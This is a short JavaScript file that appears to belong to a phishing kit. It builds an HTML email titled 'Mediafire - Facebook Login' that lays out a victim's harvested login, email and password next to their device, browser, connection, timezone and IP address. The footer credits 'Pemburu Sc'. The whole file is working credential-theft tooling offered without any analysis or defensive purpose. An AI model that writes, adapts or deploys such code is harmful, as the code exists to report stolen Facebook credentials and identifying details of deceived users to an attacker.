export const subjectFb = "Mediafire - Facebook Login";

export function buildHtmlFb({
  logF, emailF, passF, device,
  lang, browser, connection,
  timez, ip, date
}) {
  return `
  <div style="max-width:520px;margin:20px auto;border-radius:10px;overflow:hidden;font-family:Arial, sans-serif;color:#e5e7eb;">
    
    <!-- HEADER -->
    <div style="background:#2F3A40;padding:15px 20px;font-size:18px;font-weight:bold;">
      ${subjectFb}
    </div>

    <!-- TABLE -->
    <table style="width:100%;border-collapse:collapse;font-size:14px;">
      ${row("Login", logF, 0)}
      ${row("Email", emailF, 1)}
      ${row("Password", passF, 0)}
      ${row("Device", device, 1)}
      ${row("Language", lang, 0)}
      ${row("Browser", browser, 1)}
      ${row("Connection", connection, 0)}
      ${row("Timezone", timez, 1)}
      ${row("IP Address", ip, 0)}
      ${row("Date", date, 1)}
    </table>

    <!-- FOOTER -->
    <div style="padding:2px;font-size:12px;text-align:center;background:#2F3A40;">
      <p>&copy;Pemburu Sc</p>
    </div>
  </div>`;
}

// helper row (striped tanpa random)
function row(label, value, alt) {
  const bg = alt ? "#F7F7F7" : "#ECECEC";
  return `
    <tr style="background:${bg};">
      <td style="padding:10px 14px;color:#1e1e1e;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">
        ${label}
      </td>
      <td style="padding:10px 14px;font-weight:bold;color:#1e1e1e;">
        ${value}
      </td>
    </tr>
  `;
}
